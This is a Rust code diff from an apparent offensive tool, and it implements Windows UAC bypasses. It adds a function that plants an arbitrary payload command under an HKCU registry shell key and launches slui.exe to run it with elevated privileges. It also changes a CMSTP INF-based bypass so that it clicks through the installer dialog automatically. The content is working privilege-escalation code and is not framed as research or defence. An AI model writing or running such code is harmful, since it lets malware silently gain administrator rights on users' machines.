@@ -12,9 +12,46 @@ use winapi::um::winuser::{
     SW_SHOWNORMAL,
 };
 use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN};
+#[cfg(target_os = "windows")]
+use winreg::enums::*;
+#[cfg(target_os = "windows")]
+use winreg::RegKey;
 
+/// Create/modify a registry value under HKCU
+#[cfg(target_os = "windows")]
+pub fn set_hkcu_value(
+    path: &str,
+    name: Option<&str>,        // None => (Default)
+    value: Option<&str>,       // None => no data
+    create: bool,
+) -> std::io::Result<()> {
+    use winreg::enums::*;
+    use winreg::RegKey;
 
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
 
+    let key = if create {
+        hkcu.create_subkey(path)?.0
+    } else {
+        hkcu.open_subkey_with_flags(path, KEY_SET_VALUE)?
+    };
+
+    match (name, value) {
+        // named value with data
+        (Some(n), Some(v)) => key.set_value(n, &v)?,
+
+        // default value with data
+        (None, Some(v)) => key.set_value("", &v)?,
+
+        // named value with NO data
+        (Some(n), None) => key.set_value(n, &"")?, // see note below
+
+        // default value with NO data
+        (None, None) => key.set_value("", &"")?,
+    }
+
+    Ok(())
+}
 static INF_TEMPLATE: &str = r#"[version]
 Signature=$chicago$
 AdvancedINF=2.5
@@ -66,14 +103,13 @@ fn execute_cmstp(inf_file: &str) {
         .spawn()
         .expect("Failed to start cmstp.exe");
 
-    let window_titles = ["CorpVPN", "cmstp"];
+    let window_titles = ["CorpVPN", "cmstp","Connection Manager Profile Installer","cmstp.exe"];
 
     for title in &window_titles {
         if interact_with_window(title) {
             break;
         }
     }
-
     child.wait().expect("Failed to wait on cmstp.exe");
 }
 
@@ -96,17 +132,13 @@ fn interact_with_window(process_name: &str) -> bool {
                 null_mut(),
                 CString::new("OK").unwrap().as_ptr(),
             );
-            if !ok_button.is_null() {
-                SendMessageA(ok_button, BM_CLICK, 0, 0);
-                return true;
-            }
 
+            SendMessageA(ok_button, BM_CLICK, 0, 0);
             simulate_keypress();
+
             return true;
         }
     }
-
-    false
 }
 
 fn simulate_keypress() {
@@ -127,7 +159,58 @@ fn simulate_keypress() {
         SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
     }
 }
+
+pub fn delete_hkcu_key(path: &str) -> std::io::Result<()> {
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+
+    match hkcu.delete_subkey_all(path) {
+        Ok(_) => {
+            println!("Successfully cleaned up");
+            Ok(())
+        }
+        Err(e) => {
+            eprintln!("Failed to delete key: {}", e);
+            Err(e)
+        }
+    }
+}
+
+pub fn uac_slui(payload: &String) {
+    let path = "Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command";
+
+    // 🔹 best effort cleanup before starting
+    let _ = delete_hkcu_key(path);
+
+    // 🔹 create default value
+    if let Err(e) = set_hkcu_value(path, None, Some(payload.as_str()), true) {
+        eprintln!("Failed to set default value: {}", e);
+        let _ = delete_hkcu_key(path);
+        return;
+    }
+
+    // 🔹 create DelegateExecute
+    if let Err(e) = set_hkcu_value(path, Some("DelegateExecute"), None, true) {
+        eprintln!("Failed to set DelegateExecute: {}", e);
+        let _ = delete_hkcu_key(path);
+        return;
+    }
+
+    thread::sleep(Duration::from_secs(5));
+
+    // 🔹 launch trigger
+    if let Err(e) = Command::new("slui.exe")
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+    {
+        eprintln!("Failed to launch slui.exe: {}", e);
+        let _ = delete_hkcu_key(path);
+        return;
+    }
+}
+
 pub fn elevate_uac(command: &String){
     let inf_file = self::generate_inf_file(&command);
     self::execute_cmstp(&inf_file);
 }
+
